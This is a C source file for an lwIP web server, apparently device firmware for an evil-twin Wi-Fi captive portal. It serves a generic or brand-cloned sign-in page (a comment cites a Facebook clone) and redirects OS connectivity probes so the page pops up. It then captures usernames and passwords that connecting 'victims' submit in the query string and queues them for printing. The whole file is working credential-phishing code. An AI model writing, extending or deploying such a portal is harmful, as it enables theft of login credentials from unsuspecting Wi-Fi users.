#include "web_lwip.h"
#include <lwip/tcp.h>
#include <lwip/pbuf.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <string.h>

static struct tcp_pcb* web_listen = NULL;
static void (*web_render)(char*, size_t) = NULL;
static bool web_portal = false;

// Selected captive-portal page, set by web_lwip_start_portal(): the .ino resolves the chosen
// portal (Default/brand-gzip/Custom) and hands the bytes here. body==NULL falls back to the
// built-in generic sign-in page below. gzip blobs live in flash (immutable, safe to stream
// zero-copy); the custom buffer is a mutable global, so it is streamed with COPY so a mid-send
// PORTALHTML cannot corrupt the in-flight body (lwIP copies into pbufs as we chunk).
static const char* g_portal_body = NULL;
static int         g_portal_len  = 0;
static bool        g_portal_gzip = false;
static bool        g_portal_copy = false;

// Single-slot credential queue: web_recv runs in the tcpip thread and must NOT touch Serial1
// (two threads on one UART -> corruption; a blocking UART write stalls the stack). So it parks the
// captured query string here and loop() drains + prints EV: via web_lwip_poll_creds().
static volatile bool g_creds_ready = false;
static char g_creds[128];

// Per-connection send cursor for the (possibly large, e.g. 39KB facebook) portal body: the body
// can exceed one tcp_sndbuf, so it is streamed across tcp_sent callbacks. Allocated in web_recv,
// freed on completion or on tcp_err (a victim that drops mid-send must not leak it).
struct web_send { const char* body; int len; int off; u8_t copy; };

// Minimal captive-portal sign-in page (flash). Fallback when no portal is selected. The form
// submits via GET, so the credentials arrive as /login?user=..&pass=.. and are captured from the
// query string.
static const char PORTAL_BODY[] =
    "<!doctype html><html><head><meta charset=utf-8>"
    "<meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title></head>"
    "<body style='font-family:sans-serif;text-align:center;padding-top:36px'>"
    "<h2>Sign in to continue</h2>"
    "<form action=/login method=get>"
    "<input name=user placeholder=Username style='display:block;margin:8px auto;padding:9px;width:220px'>"
    "<input name=pass type=password placeholder=Password style='display:block;margin:8px auto;padding:9px;width:220px'>"
    "<button style='padding:9px 28px'>Connect</button></form></body></html>";

static const char CAPTIVE_JSON_RESP[] =
    "HTTP/1.1 200 OK\r\nContent-Type: application/captive+json\r\nConnection: close\r\n\r\n"
    "{\"captive\":true,\"user-portal-url\":\"http://192.168.4.1/\"}";

static const char REDIRECT_RESP[] =
    "HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/\r\nConnection: close\r\n\r\n";

// OS connectivity-probe URLs -> 302 to the portal root, which triggers the sign-in popup.
static bool is_probe(const char* path) {
    static const char* pr[] = {"generate_204", "gen_204", "ncsi", "hotspot",
                               "connecttest", "success", "redirect", "canonical"};
    for (unsigned i = 0; i < sizeof(pr) / sizeof(pr[0]); i++)
        if (strstr(path, pr[i])) return true;
    return false;
}

static err_t web_poll(void* arg, struct tcp_pcb* tpcb) {
    (void)arg; tcp_abort(tpcb); return ERR_ABRT;   // drop a stalled half-open connection
}

// Build "HTTP/1.1 200 OK ... [Content-Encoding: gzip] Content-Length: <bl>\r\n\r\n" into hdr
// (manual itoa: this TU's snprintf is the reduced Realtek DiagSnPrintf that mangles %u). The
// Content-Length is the FULL body length even when the body is streamed across several writes.
static int http_hdr(char* hdr, size_t bl, bool gzip) {
    strcpy(hdr, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n");
    char* h = hdr + strlen(hdr);
    if (gzip) { strcpy(h, "Content-Encoding: gzip\r\n"); h += strlen(h); }
    strcpy(h, "Content-Length: "); h += strlen(h);
    char tmp[12]; int t = 0; size_t v = bl;
    do { tmp[t++] = (char)('0' + v % 10); v /= 10; } while (v);
    while (t) *h++ = tmp[--t];
    strcpy(h, "\r\nConnection: close\r\n\r\n");
    return (int)strlen(hdr);
}

// Release the send cursor + unhook callbacks, then close. Called once the whole body is queued,
// and (with ws==NULL) for the small single-write responses that need no cursor.
static void web_finish(struct tcp_pcb* tpcb, struct web_send* ws) {
    tcp_arg(tpcb, NULL);
    tcp_sent(tpcb, NULL);
    tcp_err(tpcb, NULL);
    if (ws) mem_free(ws);
    tcp_close(tpcb);
}

// Queue as much of the remaining body as tcp_sndbuf allows; the tcp_sent callback resumes this
// when the window drains. When the last byte is queued, close (lwIP flushes queued data before
// the FIN). Zero-copy for flash gzip blobs; COPY for the mutable custom buffer.
static err_t web_send_body(struct tcp_pcb* tpcb, struct web_send* ws) {
    while (ws->off < ws->len) {
        u16_t room = tcp_sndbuf(tpcb);
        if (room == 0) { tcp_output(tpcb); return ERR_OK; }   // full: wait for tcp_sent
        int chunk = ws->len - ws->off;
        if (chunk > (int)room) chunk = room;
        u8_t flags = ws->copy ? TCP_WRITE_FLAG_COPY : 0;
        if (ws->off + chunk < ws->len) flags |= TCP_WRITE_FLAG_MORE;
        err_t e = tcp_write(tpcb, ws->body + ws->off, (u16_t)chunk, flags);
        if (e == ERR_MEM) { tcp_output(tpcb); return ERR_OK; } // pbufs exhausted: retry on tcp_sent
        if (e != ERR_OK) { web_finish(tpcb, ws); return ERR_OK; }
        ws->off += chunk;
    }
    tcp_output(tpcb);
    web_finish(tpcb, ws);   // all bytes queued
    return ERR_OK;
}

static err_t web_sent(void* arg, struct tcp_pcb* tpcb, u16_t len) {
    (void)len;
    struct web_send* ws = (struct web_send*)arg;
    if (ws) return web_send_body(tpcb, ws);
    return ERR_OK;
}

static void web_err(void* arg, err_t err) {
    (void)err;
    if (arg) mem_free(arg);   // peer aborted/reset mid-send: pcb already freed by lwIP, free cursor
}

static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err) {
    (void)arg; (void)err;
    if (p == NULL) { tcp_close(tpcb); return ERR_OK; }     // peer closed
    // copy the request line out of the FIRST pbuf before freeing (most GETs fit one segment)
    char req[200];
    u16_t rl = p->len < (u16_t)(sizeof(req) - 1) ? p->len : (u16_t)(sizeof(req) - 1);
    memcpy(req, p->payload, rl); req[rl] = 0;
    tcp_recved(tpcb, p->tot_len);
    pbuf_free(p);

    if (!web_portal) {
        // --- WebUI mode: serve the render() status page to any request ---
        if (web_render) {
            static char body[800];
            web_render(body, sizeof(body));
            size_t bl = strlen(body);
            char hdr[160]; int hl = http_hdr(hdr, bl, false);
            if (tcp_sndbuf(tpcb) >= (u16_t)(hl + (int)bl)) {
                tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY);
                tcp_write(tpcb, body, (u16_t)bl, TCP_WRITE_FLAG_COPY);
                tcp_output(tpcb);
            }
        }
        tcp_close(tpcb);
        return ERR_OK;
    }

    // --- captive-portal mode: parse the path from "GET <path> HTTP/1.1" ---
    char* path = NULL;
    char* sp = strchr(req, ' ');
    if (sp) { path = sp + 1; char* sp2 = strchr(path, ' '); if (sp2) *sp2 = 0; }
    if (!path || !*path) { tcp_close(tpcb); return ERR_OK; }

    // credential capture: a query string with '=' is a form submission -> park it for loop()
    char* q = strchr(path, '?');
    if (q && strchr(q, '=') && !g_creds_ready) {
        size_t n = strlen(q + 1);
        if (n > sizeof(g_creds) - 1) n = sizeof(g_creds) - 1;
        memcpy(g_creds, q + 1, n); g_creds[n] = 0;
        g_creds_ready = true;              // loop() drains + prints "EV:<query>"
    }

    if (strncmp(path, "/cp.json", 8) == 0) {
        tcp_write(tpcb, CAPTIVE_JSON_RESP, (u16_t)(sizeof(CAPTIVE_JSON_RESP) - 1), 0);
        tcp_output(tpcb);
        tcp_close(tpcb);
        return ERR_OK;
    }
    if (is_probe(path)) {
        tcp_write(tpcb, REDIRECT_RESP, (u16_t)(sizeof(REDIRECT_RESP) - 1), 0);
        tcp_output(tpcb);
        tcp_close(tpcb);
        return ERR_OK;
    }

    // --- serve the SELECTED portal page (streamed: body may exceed one sndbuf) ---
    const char* body = g_portal_body ? g_portal_body : PORTAL_BODY;
    int len          = g_portal_body ? g_portal_len  : (int)(sizeof(PORTAL_BODY) - 1);
    bool gzip        = g_portal_body ? g_portal_gzip : false;
    bool copy        = g_portal_body ? g_portal_copy : false;

    char hdr[180]; int hl = http_hdr(hdr, (size_t)len, gzip);
    if (tcp_sndbuf(tpcb) < (u16_t)hl) { tcp_close(tpcb); return ERR_OK; }  // header must fit first
    tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY);                  // header on stack: copy

    struct web_send* ws = (struct web_send*)mem_malloc(sizeof(struct web_send));
    if (!ws) { tcp_output(tpcb); tcp_close(tpcb); return ERR_OK; }         // no body, header only
    ws->body = body; ws->len = len; ws->off = 0; ws->copy = copy ? 1 : 0;
    tcp_arg(tpcb, ws);
    tcp_sent(tpcb, web_sent);
    tcp_err(tpcb, web_err);        // free the cursor if the peer resets mid-send
    return web_send_body(tpcb, ws);
}

static err_t web_accept(void* arg, struct tcp_pcb* newpcb, err_t err) {
    (void)arg; (void)err;
    if (newpcb == NULL) return ERR_VAL;
    tcp_recv(newpcb, web_recv);
    tcp_poll(newpcb, web_poll, 8 /* ~4s */);
    return ERR_OK;
}

static bool web_listen_start() {
    if (web_listen) return true;
    struct tcp_pcb* pcb = tcp_new();
    if (!pcb) return false;
    if (tcp_bind(pcb, IP_ADDR_ANY, 80) != ERR_OK) { tcp_close(pcb); return false; }
    web_listen = tcp_listen(pcb);
    if (!web_listen) { tcp_close(pcb); return false; }
    tcp_accept(web_listen, web_accept);
    return true;
}

bool web_lwip_start(void (*render)(char* buf, size_t cap)) {
    web_render = render; web_portal = false;
    return web_listen_start();
}

bool web_lwip_start_portal(const char* body, int len, bool gzip, bool copy) {
    web_render = NULL; web_portal = true; g_creds_ready = false;
    g_portal_body = (body && len > 0) ? body : NULL;
    g_portal_len  = len; g_portal_gzip = gzip; g_portal_copy = copy;
    return web_listen_start();
}

bool web_lwip_poll_creds(char* buf, int cap) {
    if (!g_creds_ready) return false;
    int n = (int)strlen(g_creds);
    if (n > cap - 1) n = cap - 1;
    memcpy(buf, g_creds, n); buf[n] = 0;
    g_creds_ready = false;
    return true;
}

void web_lwip_stop() {
    if (web_listen) { tcp_close(web_listen); web_listen = NULL; }
    web_portal = false; g_creds_ready = false;
    g_portal_body = NULL; g_portal_len = 0;
}
